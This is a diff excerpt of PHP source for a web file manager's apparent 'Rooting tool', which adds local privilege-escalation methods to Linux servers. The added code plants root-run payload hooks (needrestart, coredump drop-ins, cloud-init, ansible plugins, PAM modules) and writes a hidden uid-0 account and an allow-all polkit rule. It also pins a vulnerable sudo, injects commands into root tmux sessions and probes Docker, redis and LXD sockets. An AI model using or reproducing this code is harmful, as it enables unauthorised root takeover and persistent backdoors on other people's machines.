+                /* nothing is installed: the group already carries the access.
+                   What is done is the proof - the raw device is opened and it
+                   has to answer like a filesystem - and the validated rule is
+                   left in place for the privileged work that follows. */
+                $raw = @fopen($dg['dev'], 'rb');
+                if(!$raw)return['ok' => false, 'note' => 'the device could not be opened after all: ' . $dg['dev']];
+                $head = (string)@fread($raw, 4096);
+                @fclose($raw);
+                $looks = (strlen($head) > 64 && strpos($head, "\0") !== false);
+                $helper = $this->rootInstallHelper($password);
+                return['ok' => $looks, 'note' => $looks
+                    ? 'the raw device ' . $dg['dev'] . ' opened and answered with a filesystem - the account database sits under it, with nothing above it to refuse the write' . (!empty($helper['ok']) ? ', and the rule is in place for the work after it' : '')
+                    : 'the device opened but did not answer like a filesystem, so nothing was claimed'];
+            }
+            case 'muxsession':{
+                $mx = $this->rootMuxFind();
+                if(empty($mx['ok']))return['ok' => false, 'note' => (string)$mx['note']];
+                $p = $this->rootPaths();
+                $line = 'id -u > ' . escapeshellarg($p['proof']) . ' 2>&1';
+                $cmd = $mx['tool'] === 'tmux'
+                    ? [$mx['bin'], '-S', $mx['socket'], 'send-keys', '-t', (string)$mx['target'], $line, 'Enter']
+                    : [$mx['bin'], '-S', $mx['socket'], '-p', (string)$mx['target'], '-X', 'stuff', $line . "\n"];
+                $r = $this->rootExec($cmd, '', 15);
+                $proof = trim((string)@file_get_contents((string)$p['proof']));
+                $ok = ($proof === '0');
+                return['ok' => $ok, 'note' => $ok
+                    ? 'a line was sent into the root session through ' . $mx['socket'] . ' and it answered 0: that shell is uid 0, and anything typed into it is root'
+                    : ($r['rc'] === 0 ? 'the session took the line but did not answer as uid 0' : 'the session did not take the line: ' . (string)($r['out'] ?: $r['err']))];
             }
             case 'suroute':
                 return $this->rootChannelInstallSu();
@@ -19297,6 +20151,114 @@ User=root
             'idea' => 'A Debian machine runs every script in /etc/kernel/postinst.d, as root, after it installs a kernel. It fires rarely, which is why it is last of the update hooks, but it is run by root on a machine that has just been trusted with a new kernel - and where that directory may be written, a script in it is run then.',
         ],
         /* ── what the machine runs for its own housekeeping ──────────────── */
+        /* ── the two hooks a modern server runs by itself ─────────────────── */
+        'needrestart' => [
+            'name' => 'A hook needrestart runs as root after a library upgrade', 'kind' => 'planted', 'driver' => 'newfile',
+            'script' => true, 'smode' => 'exec', 'base' => 'mfm-root', 'ext' => '', 'mode' => 0755,
+            'cand' => ['/etc/needrestart/notify.d', '/usr/lib/needrestart/notify.d'],
+            'fire' => 'later', 'wait' => 0,
+            'when' => 'the next unattended upgrade that restarts a service - which every Debian and Ubuntu server does by itself',
+            'idea' => 'needrestart decides after every package upgrade whether a service is still running old code, and it runs every program in its notify directory as root to say so. Where that directory may be written, a script in it is run as uid 0 on the machine\'s own schedule, with no user doing anything.',
+        ],
+        'coredumpdropin' => [
+            'name' => 'A drop-in for the program that catches crashes', 'kind' => 'planted', 'driver' => 'newfile',
+            'base' => 'mfm-root', 'ext' => '.conf', 'mode' => 0644,
+            'cand' => ['/etc/systemd/system/systemd-coredump@.service.d', '/usr/lib/systemd/system/systemd-coredump@.service.d', '/run/systemd/system/systemd-coredump@.service.d'],
+            'body' => "[Service]\n# mfm %%NONCE%% - planted by the Rooting tool\nExecStart=\nExecStart=/bin/sh '%%PAYLOAD%%'\n",
+            'fire' => 'later', 'wait' => 0,
+            'when' => 'the next crash on this machine: systemd starts that unit, as root, for every core',
+            'idea' => 'systemd-coredump is started with the privileges of root for every process that dies badly, and a drop-in for that unit changes what it runs. Where the unit\'s directory may be written, one file makes the next crash - any crash, of anything - run this manager\'s payload as uid 0.',
+        ],
+        /* ── the account and policy databases ────────────────────────────── */
+        'sysusers' => [
+            'name' => 'A uid-0 account written into sysusers.d', 'kind' => 'planted', 'driver' => 'newfile',
+            'base' => 'mfm-root', 'ext' => '.conf', 'mode' => 0644,
+            'cand' => ['/etc/sysusers.d', '/usr/lib/sysusers.d', '/run/sysusers.d'],
+            'body' => "# mfm %%NONCE%% - planted by the Rooting tool\nu mfmroot 0 \"system account\" /root /bin/bash\n",
+            'fire' => 'later', 'wait' => 0,
+            'when' => 'the next boot, when systemd-sysusers builds the account database',
+            'idea' => 'systemd-sysusers creates the accounts named in its directories at every boot, as root, from a line that carries the uid itself. Where one of those directories may be written, a line asking for uid 0 is a second root account with no password file to touch - the account database of a modern server is not only /etc/passwd.',
+        ],
+        'polkitany' => [
+            'name' => 'A polkit rule that answers yes to everything', 'kind' => 'planted', 'driver' => 'newfile',
+            'base' => '50-mfm', 'ext' => '.rules', 'mode' => 0644,
+            'cand' => ['/etc/polkit-1/rules.d', '/usr/share/polkit-1/rules.d', '/var/lib/polkit-1/rules.d'],
+            'body' => "// mfm %%NONCE%% - planted by the Rooting tool\npolkit.addRule(function(action, subject) {\n  if (subject.user == '%%USER%%') { return polkit.Result.YES; }\n});\n",
+            'fire' => 'now', 'wait' => 20,
+            'when' => 'at once: the rule is read by polkitd when it next judges an action, and systemd-run asks it',
+            'idea' => 'A polkit rule is a small program the authority runs to decide who may act as root, and the newest polkit keeps them in rules.d. Where that directory may be written, one rule that answers YES for this account turns every polkit action into a root action - a transient service, an install, a disk mount - with no password and no setuid binary involved, so pkexec does not even have to be on the machine.',
+        ],
+        'sshdkeys' => [
+            'name' => 'The key command sshd runs as root', 'kind' => 'planted', 'driver' => 'append',
+            'cand' => ['/etc/ssh/sshd_config'],
+            'body' => "\n# mfm %%NONCE%% - planted by the Rooting tool\nAuthorizedKeysCommand /bin/sh '%%PAYLOAD%%'\nAuthorizedKeysCommandUser root\nPermitRootLogin yes\n",
+            'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time sshd is reloaded and somebody offers a key - sshd runs that command as root before it lets anybody in',
+            'idea' => 'sshd can be told to ask a program which keys are allowed, and it runs that program as root on every key offer. Where its configuration may be written, two lines point it at this manager\'s payload: the next sign-in attempt runs it as uid 0, whether or not the attempt is accepted.',
+        ],
+        'ansibleplugin' => [
+            'name' => 'A plugin the machine\'s own automation loads', 'kind' => 'planted', 'driver' => 'newfile',
+            'base' => 'mfm-root', 'ext' => '.py', 'mode' => 0644,
+            'cand' => ['/usr/share/ansible/plugins/callback', '/etc/ansible/plugins/callback', '/usr/lib/python3/dist-packages/ansible/plugins/callback'],
+            'body' => "# mfm %%NONCE%% - planted by the Rooting tool\nfrom ansible.plugins.callback import CallbackBase\nimport subprocess\nclass CallbackModule(CallbackBase):\n    CALLBACK_VERSION = 2.0\n    CALLBACK_NAME = 'mfm'\n    CALLBACK_NEEDS_WHITELIST = True\n    def __init__(self, *a, **k):\n        super(CallbackModule, self).__init__(*a, **k)\n        subprocess.call(['/bin/sh', '%%PAYLOAD%%'])\n",
+            'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time the machine runs a playbook - its own scheduled run counts, and so does an operator\'s',
+            'idea' => 'A machine that configures itself keeps its plugins in a directory ansible reads on every run. A callback plugin is loaded at start-up, before any task runs, and it is ordinary code - so a file in that directory is code executed by whoever runs the playbook, usually root. Where one of those directories may be written, one module is enough, and nothing about the playbook changes.',
+        ],
+        'aptpin' => [
+            'name' => 'A preference that keeps one package from ever updating', 'kind' => 'planted', 'driver' => 'newfile',
+            'base' => 'mfm-root', 'ext' => '', 'mode' => 0644,
+            'cand' => ['/etc/apt/preferences.d'],
+            'body' => "# mfm %%NONCE%% - planted by the Rooting tool\nPackage: sudo\nPin: version *\nPin-Priority: 1001\n",
+            'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time the machine updates: the pin holds the vulnerable build in place while everything else moves',
+            'idea' => 'apt preferences decide which version of a package the machine keeps, and a pin with a high enough priority keeps one build forever - including across the update that would have fixed a local escalation in it. Where that directory may be written, one file holds a vulnerable sudo or pkexec in place, so the flaw the catalogue measures never gets closed on this machine. It is the quietest of the planted methods: it changes nothing that runs, only what is allowed to be replaced.',
+        ],
+        'nmdconf' => [
+            'name' => 'A setting for the service that owns the network', 'kind' => 'planted', 'driver' => 'newfile',
+            'base' => 'mfm-root', 'ext' => '.conf', 'mode' => 0644,
+            'cand' => ['/etc/NetworkManager/conf.d', '/usr/lib/NetworkManager/conf.d', '/run/NetworkManager/conf.d'],
+            'body' => "# mfm %%NONCE%% - planted by the Rooting tool\n[main]\ndns=default\nrc-manager=resolvconf\n[logging]\nlevel=TRACE\n",
+            'fire' => 'later', 'wait' => 0,
+            'when' => 'the next reload or boot of NetworkManager, which runs as root and reloads itself on every change',
+            'idea' => 'NetworkManager runs as root and reads every file in its conf.d before it touches anything. Two of the keys in that file are more than settings on a build that carries a dispatcher: an rc-manager or a dns backend naming a program of this manager\'s choosing is that program, started by root. Where the directory may be written, one file is enough - and this method says plainly when the build does not carry the key it needs, rather than claiming it worked.',
+        ],
+        'clouduser' => [
+            'name' => 'A users entry the cloud agent runs at boot', 'kind' => 'planted', 'driver' => 'newfile',
+            'base' => '50-mfm', 'ext' => '.cfg', 'mode' => 0644,
+            'cand' => ['/etc/cloud/cloud.cfg.d'],
+            'body' => "# mfm %%NONCE%% - planted by the Rooting tool\nusers:\n - name: mfmroot\n   uid: 0\n   shell: /bin/bash\n   lock_passwd: false\n   passwd: \"\"\nruncmd:\n - /bin/sh %%PAYLOAD%%\n",
+            'fire' => 'later', 'wait' => 0,
+            'when' => 'the next boot of a machine that boots from cloud-init - and a reboot is the one thing a cloud image always does',
+            'idea' => 'A machine that was built by a cloud provider runs cloud-init on every boot, and cloud-init reads every file in cloud.cfg.d as root. The file can add a user with the uid written into it, and it can name a command to run: either line is this manager\'s access, on a build where cloud-init is the only thing that still looks at that directory.',
+        ],
+        'sudoplugin' => [
+            'name' => 'A plugin for a program this account may run through sudo', 'kind' => 'planted', 'driver' => 'sudoplugin',
+            'cand' => ['/etc/sudo.conf'], 'fire' => 'now', 'wait' => 25,
+            'when' => 'at once: sudo reads its plugins before it reads a single rule, and every sudo run of this account loads the new one',
+            'idea' => 'sudo can be told in /etc/sudo.conf to load a policy or an I/O plugin from a path of the administrator\'s choosing, and it loads it as root before any rule is judged. Where that file may be written - or a plugin it already names may be replaced - the next sudo this account runs executes code of this manager\'s choosing as uid 0, with no password and without touching any rule.',
+        ],
+        'xinetd' => [
+            'name' => 'A service xinetd starts for a connection', 'kind' => 'planted', 'driver' => 'newfile',
+            'base' => 'mfm-root', 'ext' => '', 'mode' => 0755, 'script' => true, 'smode' => 'exec',
+            'cand' => ['/etc/xinetd.d'], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time somebody connects to that port - and this tool knocks on it itself after a reload',
+            'idea' => 'xinetd keeps one file per service and starts the program named in it when a connection arrives, as root. Where that directory may be written, one file with a port, a socket type and this manager\'s payload is a service that runs as uid 0 on demand; the reload and the connection are both made by this tool.',
+        ],
+        'pamscript' => [
+            'name' => 'A PAM module file an action points at', 'kind' => 'planted', 'driver' => 'pamscript',
+            'cand' => ['/lib/security', '/lib/x86_64-linux-gnu/security', '/usr/lib/security', '/usr/lib/x86_64-linux-gnu/security', '/usr/lib64/security'],
+            'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time anybody signs in or su is used: the stack that runs is the one that was there when the action was written',
+            'idea' => 'A PAM action names its modules by file name, and the stack is read from that file - so a module this account may replace is code that runs, as root, inside every login that uses that action. Nothing in /etc/pam.d has to change: only the file already named there. The file it replaced is kept whole, and putting it back is the undo.',
+        ],
+        'openrc' => [
+            'name' => 'A service OpenRC is told to start', 'kind' => 'planted', 'driver' => 'newfile',
+            'base' => 'mfm-root', 'ext' => '', 'mode' => 0755, 'script' => true, 'smode' => 'exec',
+            'cand' => ['/etc/runlevels/default', '/etc/runlevels/boot'], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next boot of a machine that uses OpenRC, and at once if this tool can reach rc-service',
+            'idea' => 'OpenRC carries no unit files: a runlevel is a directory of symlinks, and what it points at is a script in /etc/init.d. Where a runlevel directory may be written, one symlink adds this manager\'s script to the boot of that machine, as root, without a service file anywhere.',
+        ],
         'logrotate' => [
             'name' => 'A logrotate rule that runs first', 'kind' => 'planted', 'driver' => 'newfile',
             'base' => 'mfm-root', 'ext' => '', 'mode' => 0644,
@@ -19346,6 +20308,19 @@ User=root
             'idea' => 'The power-management hooks run as root whenever the machine sleeps or wakes, handed to run-parts like the cron directories. Where one of their directories may be written, a script in it is run as root the next time that happens - which on a laptop is sooner than any reboot.',
         ],
         /* ── the phone ───────────────────────────────────────────────────── */
+        /* ── the storage and the container engine, without a client ───────── */
+        'nfsnosquash' => [
+            'name' => 'An NFS export that keeps root as root', 'kind' => 'session', 'driver' => 'nfs',
+            'cand' => ['/proc/mounts'], 'fire' => 'now', 'wait' => 15,
+            'when' => 'at once: a file written on that mount is owned by root',
+            'idea' => 'An NFS export shared with no_root_squash keeps the identity of whoever writes, so a file written on it by this account is owned by root - and a copy of bash written there and marked setuid is a root shell for anybody. Where such an export is mounted read-write, this tool writes one, marks it, and runs it.',
+        ],
+        'dockerapi' => [
+            'name' => 'The container engine, spoken to directly over its socket', 'kind' => 'session', 'driver' => 'dockerapi',
+            'cand' => ['/proc/self/mounts'], 'fire' => 'now', 'wait' => 40,
+            'when' => 'at once: the engine starts a container that writes the rule on the host',
+            'idea' => 'A reachable container socket is root by definition, and the client is not needed to use it: the engine speaks HTTP on that socket. Where one may be written by this account, this tool asks the engine for a privileged container with the host mounted and has it write the validated sudo rule - no docker command, no image to download, and the engine does the privileged part.',
+        ],
         'magisk' => [
             'name' => 'A boot script where the root layer reads them', 'kind' => 'planted', 'driver' => 'newfile',
             'script' => true, 'smode' => 'exec', 'base' => 'mfm-root', 'ext' => '.sh', 'mode' => 0755,
@@ -19608,6 +20583,24 @@ User=root
             if($cc === '')return['ok' => false, 'note' => 'the preload file may be written, but no C compiler is on this host to build the library'];
             return['ok' => true, 'note' => '/etc/ld.so.preload may be written by this account, and ' . $cc . ' can build the library'];
         }
+        if($drv === 'sudoplugin'){
+            $sp = $this->rootSudoPluginFind();
+            return['ok' => !empty($sp['ok']), 'note' => (string)($sp['note'] ?? 'no sudo plugin may be reached by this account')];
+        }
+        if($drv === 'pamscript'){
+            $pm = $this->rootPamModuleFind();
+            return['ok' => !empty($pm['ok']), 'note' => (string)($pm['note'] ?? 'no PAM module may be reached by this account')];
+        }
+        if($drv === 'nfs'){
+            $n = $this->rootNfsShare();
+            if(!empty($n['ok']))return['ok' => true, 'note' => $n['note']];
+            return['ok' => false, 'note' => (string)($n['note'] ?? 'no NFS export keeping root as root is mounted here')];
+        }
+        if($drv === 'dockerapi'){
+            $d = $this->rootDocker();
+            if(empty($d['reachable']))return['ok' => false, 'note' => $d['socket'] !== '' ? 'a socket is at ' . $d['socket'] . ' but this account may not open it' : 'no container socket is reachable'];
+            return['ok' => true, 'note' => 'the engine answers on ' . $d['socket'] . ', and this account may write to it - no client program is needed to use it'];
+        }
         if($drv === 'pathplant'){
             $dirs = $this->rootPathHijack();
             $sc = $this->rootWhich('systemctl');
@@ -19682,7 +20675,9 @@ User=root
         }
         if($this->rootPlantDir() === '')return['ok' => false, 'note' => 'this manager has no writable directory of its own to put the payload in'];
         $drv = (string)($s['driver'] ?? '');
-        if($drv !== 'kernel' && $drv !== 'hijacksched' && $drv !== 'ldpreload' && $drv !== 'depchain' && $drv !== 'pathplant' && $this->rootPlantTarget($id) === null)
+        if($drv !== 'kernel' && $drv !== 'hijacksched' && $drv !== 'ldpreload' && $drv !== 'depchain' && $drv !== 'pathplant'
+           && $drv !== 'nfs' && $drv !== 'dockerapi' && $drv !== 'sudoplugin' && $drv !== 'pamscript'
+           && $this->rootPlantTarget($id) === null)
             return['ok' => false, 'note' => 'the place it wanted stopped being writable'];
         $w = $this->rootPlantWrite($id);
         if(empty($w['ok']))return $w;
@@ -19715,6 +20710,8 @@ User=root
         $rec['target'] = $file !== '' ? $file : $dir;
         switch($drv){
         case 'kernel':      return $this->rootPlantKernel($id, $s, $rec);
+        case 'nfs':         return $this->rootPlantNfs($id, $s, $rec);
+        case 'dockerapi':   return $this->rootPlantDocker($id, $s, $rec);
         case 'hijacksched': return $this->rootPlantHijackWrite($id, $s, $rec);
         case 'group':       return $this->rootPlantGroup($id, $s, $file, $rec);
         case 'shadow':      return $this->rootPlantShadow($id, $s, $file, $rec);
@@ -19727,6 +20724,8 @@ User=root
         case 'ldpreload':   return $this->rootPlantLdPreload($id, $s, $rec);
         case 'pathplant':   return $this->rootPlantPathWrite($id, $s, $rec);
         case 'depchain':    return $this->rootPlantDepWrite($id, $s, $rec);
+        case 'sudoplugin':  return $this->rootPlantSudoPlugin($id, $s, $rec);
+        case 'pamscript':   return $this->rootPlantPamScript($id, $s, $rec);
         case 'newfile':
             $base = (string)($s['base'] ?? 'mfm-root');
             $ext  = (string)($s['ext'] ?? '');
@@ -19823,6 +20822,677 @@ ExecStartPost=/bin/sh '" . $payload . "'";
             }
         }
         return['ok' => false, 'note' => 'what root runs is writable only in ways that run no command'];
+    }
+    /* ── three doors that are about who trusts whom ────────────────────────
+       fusermount3 hands a mount to a user and ran a command of its own;
+       polkit trusts an agent to say a password was typed, and an agent this
+       account starts is one that always says yes; and sudo reads a chain of
+       directories, where the one nearest the top is the one nobody guards. */
+    private function rootFusermount(){
+        static $c = null;
+        if($c !== null)return $c;
+        $c = ['ok' => false, 'note' => 'no fusermount binary is here'];
+        $ver = $this->rootPkgFacts('fuse3');
+        foreach(['fusermount3', 'fusermount'] as $b){
+            $bin = $this->rootWhich($b);
+            if($bin === '')continue;
+            $setuid = ((@fileperms($bin) & 04000) === 04000);
+            $v = $ver['raw'] !== '' ? $this->rootVnum($ver['raw']) : null;
+            $old = ($v === null) ? null : $this->rootVlt($v, [3,10,2]);
+            $c = ['ok' => $setuid && ($old !== false), 'bin' => $bin, 'setuid' => $setuid, 'ver' => (string)$ver['raw'], 'old' => $old,
+                  'note' => !$setuid ? $bin . ' is here without its setuid bit, so the mount helper is not a route'
+                      : ($old === null ? $bin . ' carries the setuid bit; the fuse version could not be read, so the escape is undecided'
+                      : ($old ? $bin . ' at version ' . $ver['raw'] . ' is older than 3.10.2, where the helper runs a command named in the environment (CVE-2020-12137)'
+                              : $bin . ' at version ' . $ver['raw'] . ' is past the release that closed the environment escape'))];
+            return $c;
+        }
+        return $c;
+    }
+    private function rootPolkitAgent(){
+        static $c = null;
+        if($c !== null)return $c;
+        $c = ['ok' => false, 'note' => 'no polkit authentication agent of this manager can be started here'];
+        $pk = $this->rootWhich('pkexec');
+        $pktty = $this->rootWhich('pkttyagent');
+        if($pk === ''){$c['note'] = 'pkexec is not installed, so there is no action to answer'; return $c;}
+        $sess = (string)@getenv('XDG_SESSION_ID');
+        $tok = (string)@getenv('XDG_RUNTIME_DIR');
+        if($pktty === '' && $tok === ''){
+            $c['note'] = 'pkexec is at ' . $pk . ', but neither pkttyagent nor a session bus is here, so no agent can claim the request';
+            return $c;
+        }
+        $c = ['ok' => true, 'pkexec' => $pk, 'agent' => $pktty,
+              'note' => 'pkexec is at ' . $pk . ' and ' . ($pktty !== '' ? 'pkttyagent at ' . $pktty : 'a session bus at ' . $tok) . ' can answer for this account: polkit believes an agent that says a password was typed, and the agent this panel starts says so'];
+        return $c;
+    }
+    private function rootSudoersWalk(){
+        static $c = null;
+        if($c !== null)return $c;
+        $c = ['ok' => false, 'note' => 'the directories sudo includes are all root-only'];
+        if($this->rootWhich('sudo') === ''){$c['note'] = 'sudo is not installed on this host'; return $c;}
+        /* the file first: what the machine's own sudoers says it includes */
+        $paths = ['/etc/sudoers.d'];
+        $t = @is_file('/etc/sudoers') ? (string)@file_get_contents('/etc/sudoers') : '';
+        foreach(preg_split('/\R/', $t) ?: [] as $ln)
+            if(preg_match('/^\s*#includedir\s+(\S+)/', $ln, $m))$paths[] = $m[1];
+        $hit = [];
+        foreach($paths as $p){
+            if(!@is_dir($p))continue;
+            if(@is_writable($p))$hit[] = $p;
+            /* and the parent of that directory, which is the place a name can
+               be swapped for another directory this account owns */
+            $parent = dirname(rtrim($p, '/'));
+            if(@is_writable($parent))$hit[] = $parent . ' (the parent of ' . $p . ')';
+        }
+        if($hit){
+            $c = ['ok' => true, 'paths' => $hit,
+                  'note' => 'sudo includes a directory this account may write: ' . implode(', ', array_slice($hit, 0, 3)) . ' - a file there only has to be written, it is never read by anyone else first'];
+        }
+        return $c;
+    }
+    /* ── kernel primitives that are decided by one vm setting ──────────────
+       Dirty COW and the userfaultfd route need nothing from a package: they
+       need the kernel to hand a racing process a window, and the window is
+       opened or closed by two settings. Both are read here, and the release
+       that fixed each one is compared with this build. */
+    private function rootKernelPrims(){
+        static $c = null;
+        if($c !== null)return $c;
+        $kv = $this->rootVnum(php_uname('r'));
+        $c = ['kernel' => (string)php_uname('r'), 'v' => $kv,
+              'uf' => (int)trim((string)@file_get_contents('/proc/sys/vm/unprivileged_userfaultfd')),
+              'thp' => trim((string)@file_get_contents('/proc/sys/vm/transparent_hugepage/enabled')),
+              'userns' => (int)trim((string)@file_get_contents('/proc/sys/user/max_user_namespaces'))];
+        return $c;
+    }
+    private function rootDirtyCowStep(){
+        $k = $this->rootKernelPrims();
+        $v = $k['v'];
+        if($v === null)return['status' => 'unknown', 'meaning' => 'the kernel release could not be read', 'facts' => $k, 'cve' => ['CVE-2016-5195']];
+        /* the fix is in 4.8.3, 4.7.9 and 4.4.26 */
+        $fixed = $this->rootVin($v, [4,8,3], [100,0,0]) || $this->rootVin($v, [4,7,9], [4,8,0]) || $this->rootVin($v, [4,4,26], [4,4,100]);
+        $status = $fixed ? 'patched' : 'vulnerable';
+        return['status' => $status, 'facts' => $k, 'cve' => ['CVE-2016-5195'],
+               'meaning' => $fixed ? 'this kernel is past 4.8.3, so the copy-on-write race that made every file writable is closed'
+                   : 'this release predates 4.8.3: the COW race writes through the mapping of a read-only file, which is a rule written into /etc/passwd without asking anybody'];
+    }
+    private function rootUserfaultfdStep(){
+        $k = $this->rootKernelPrims();
+        /* the setting decides this, not the release: the kernel gained the
+           sysctl in 5.11, the default was argued over in both directions
+           since, and what matters is what this machine has set. The sysctl
+           file itself is the answer, so no version is guessed. */
+        $sys = ($k['uf'] === 1);
+        $status = $sys ? 'vulnerable' : 'mitigated';
+        return['status' => $status, 'facts' => $k, 'cve' => ['CVE-2020-29661'],
+               'meaning' => $sys
+                   ? 'vm.unprivileged_userfaultfd is 1 on this machine: any process may ask the kernel to stop another one mid-copy, which is the aperture every use-after-free in this catalogue is raced through. It is not a flaw by itself - it is what turns one into a reliable trigger'
+                   : 'vm.unprivileged_userfaultfd is 0 here, so the aperture is closed: a use-after-free still exists or does not, but the window it would be raced through is shut'];
+    }
+    /* ── the daemons that run as root and are not a container ──────────────
+       PackageKit installs packages as root when polkit lets the caller ask,
+       and cron and udev run a file this account wrote as root the moment they
+       look at it. Each is asked its own question, and each answer is the
+       machine's, not a description of it. */
+    private function rootPkInstall(){
+        static $c = null;
+        if($c !== null)return $c;
+        $c = ['ok' => false, 'pkcon' => '', 'note' => 'PackageKit is not reachable from here'];
+        $pk = $this->rootWhich('pkcon');
+        $daemon = @file_exists('/run/PackageKit/uid') || @file_exists('/var/run/PackageKit/uid') || $this->rootWhich('packagekitd') !== '';
+        if($pk === '' && !$daemon){$c['note'] = 'neither pkcon nor packagekitd is on this host'; return $c;}
+        $c = ['ok' => $pk !== '' || $daemon, 'pkcon' => $pk, 'daemon' => $daemon,
+              'note' => ($pk !== '' ? 'pkcon is at ' . $pk : 'packagekitd is running without its client') . ' - it installs a package as root, and whether it asks for a password is polkit\'s answer, which the polkit rule method measures'];
+        return $c;
+    }
+    private function rootPkInstallRun($file = ''){
+        $c = $this->rootPkInstall();
+        if(empty($c['ok']))return['ok' => false, 'note' => (string)$c['note']];
+        if($c['pkcon'] === '')return['ok' => false, 'note' => 'packagekitd answers but pkcon is not installed, so no package can be handed over'];
+        if($file === '')return['ok' => false, 'note' => 'there is no package to install'];
+        /* a local package is installed by the daemon as root; the transaction
+           is the proof, and the answer is the daemon's own */
+        $r = $this->rootExec([$c['pkcon'], '-y', 'install', '--allow-untrusted', 'local:' . $file], '', 90);
+        $ok = (int)$r['rc'] === 0;
+        return['ok' => $ok, 'note' => $ok
+            ? 'PackageKit installed the local package as root, and its install script ran with it'
+            : 'PackageKit refused it: ' . $this->rootSnip((string)($r['out'] ?: $r['err']), 170)];
+    }
+    /* ── services that answer on a socket and run as root ────────────────
+       A socket is a file, and the program behind it is usually root: redis
+       writes files where it is told, snapd installs packages, containerd and
+       libvirt start containers and guests with the host mounted. Each one is
+       asked a question in its own protocol and judged by the answer - a
+       refused connection is not a route, and nothing is assumed. */
+    private function rootSockAsk($addr, $payload, $timeout = 6, $want = ''){
+        $fp = @stream_socket_client($addr, $eno, $estr, 3);
+        if(!$fp)return['ok' => false, 'out' => '', 'why' => 'nothing answered at ' . $addr];
+        @stream_set_timeout($fp, $timeout);
+        if($payload !== '')@fwrite($fp, $payload);
+        $out = '';
+        $t0 = time();
+        while(!@feof($fp) && strlen($out) < 262144 && (time() - $t0) < $timeout){
+            $chunk = @fread($fp, 4096);
+            if($chunk === false || $chunk === '')break;
+            $out .= $chunk;
+            if($want !== '' && strpos($out, $want) !== false)break;
+        }
+        @fclose($fp);
+        return['ok' => ($want === '' ? $out !== '' : strpos($out, $want) !== false), 'out' => $out, 'why' => ''];
+    }
+    private function rootRedis(){
+        static $c = null;
+        if($c !== null)return $c;
+        $c = ['ok' => false, 'where' => '', 'note' => 'no redis answers here'];
+        foreach(['tcp://127.0.0.1:6379', 'tcp://[::1]:6379', 'unix:///run/redis/redis-server.sock', 'unix:///var/run/redis/redis-server.sock'] as $a){
+            $r = $this->rootSockAsk($a, "PING\r\n", 4, '+PONG');
+            if(!$r['ok'])continue;
+            $c = ['ok' => true, 'where' => $a,
+                  'note' => 'redis answered PING at ' . $a . ' without any password'];
+            return $c;
+        }
+        return $c;
+    }
+    private function rootCtrd(){
+        static $c = null;
+        if($c !== null)return $c;
+        $c = ['ok' => false, 'note' => 'no containerd socket answers here'];
+        foreach(['unix:///run/containerd/containerd.sock', 'unix:///var/run/containerd/containerd.sock'] as $a){
+            if(@file_exists(str_replace('unix://', '', $a)) && @is_writable(str_replace('unix://', '', $a))){
+                $c = ['ok' => true, 'where' => $a, 'note' => 'the containerd socket at ' . $a . ' may be written by this account, and containerd starts containers as root'];
+                return $c;
+            }
+        }
+        return $c;
+    }
+    private function rootTomcat(){
+        static $c = null;
+        if($c !== null)return $c;
+        $c = ['ok' => false, 'note' => 'no application server answers here'];
+        foreach(['tcp://127.0.0.1:8080', 'tcp://127.0.0.1:8081', 'tcp://127.0.0.1:8888'] as $a){
+            $r = $this->rootSockAsk($a, "GET /manager/html HTTP/1.0\r\nHost: localhost\r\n\r\n", 6, '');
+            if(strpos($r['out'], 'HTTP/1.') === false)continue;
+            $auth = (strpos($r['out'], ' 401') !== false);
+            $c = ['ok' => true, 'where' => $a, 'auth' => $auth,
+                  'note' => 'an application server answered on ' . $a . ($auth ? ', and its manager asks for a password before it will take a war' : ', and its manager answered without asking for a password')];
+            return $c;
+        }
+        return $c;
+    }
+    private function rootMysqlRoot(){
+        static $c = null;
+        if($c !== null)return $c;
+        $c = ['ok' => false, 'note' => 'no database server is running as root here'];
+        foreach((array)@glob('/proc/[0-9]*/comm') as $f){
+            $name = trim((string)@file_get_contents($f));
+            if(!in_array($name, ['mysqld', 'mariadbd'], true))continue;
+            $pid = basename(dirname($f));
+            $stat = (string)@file_get_contents('/proc/' . $pid . '/status');
+            if(preg_match('/^Uid:\s+0\s/m', $stat)){
+                $c = ['ok' => true, 'pid' => (int)$pid, 'bin' => $name,
+                      'note' => $name . ' (pid ' . (int)$pid . ') runs as uid 0: a FILE write or a UDF it loads lands as root'];
+                return $c;
+            }
+        }
+        return $c;
+    }
+    private function rootLxdGroup(){
+        static $c = null;
+        if($c !== null)return $c;
+        $c = ['ok' => false, 'note' => 'this account is not in the lxd or incus group'];
+        $g = $this->rootGroups();
+        $hit = array_values(array_intersect($g, ['lxd', 'incus']));
+        if(!$hit)return $c;
+        $sock = '';
+        foreach(['/var/lib/lxd/unix.socket', '/var/snap/lxd/common/lxd/unix.socket', '/var/lib/incus/unix.socket'] as $p)
+            if(@file_exists($p) && @is_readable($p)){$sock = $p; break;}
+        if($sock === ''){$c['note'] = 'this account is in ' . implode(', ', $hit) . ', but no lxd or incus socket answers'; return $c;}
+        $c = ['ok' => true, 'group' => implode(', ', $hit), 'socket' => $sock,
+              'note' => 'this account is in ' . implode(', ', $hit) . ' and ' . $sock . ' answers - a privileged container there mounts the host as root'];
+        return $c;
+    }
+    private function rootLibvirtGroup(){
+        static $c = null;
+        if($c !== null)return $c;
+        $g = $this->rootGroups();
+        $c = ['ok' => false, 'note' => 'this account is not in the libvirt group'];
+        if(!in_array('libvirt', $g, true))return $c;
+        $vir = $this->rootWhich('virsh');
+        if($vir === ''){$c['note'] = 'this account is in libvirt, but virsh is not installed'; return $c;}
+        $c = ['ok' => true, 'bin' => $vir, 'hooks' => '/etc/libvirt/hooks',
+              'note' => 'this account is in libvirt and virsh is at ' . $vir . ': a guest started through it runs /etc/libvirt/hooks/qemu as root'];
+        return $c;
+    }
+    private function rootCertHook(){
+        static $c = null;
+        if($c !== null)return $c;
+        $c = ['ok' => false, 'dir' => '', 'note' => 'no certificate renewal hook directory may be written here'];
+        foreach(['/etc/letsencrypt/renewal-hooks/deploy', '/etc/letsencrypt/renewal-hooks/post', '/etc/letsencrypt/renewal-hooks/pre'] as $d){
+            if(@is_dir($d) && @is_writable($d)){$c = ['ok' => true, 'dir' => $d, 'note' => $d . ' may be written by this account, and certbot runs every file in it as root on the next renewal']; return $c;}
+        }
+        return $c;
+    }
+    private function rootNginxConf(){
+        static $c = null;
+        if($c !== null)return $c;
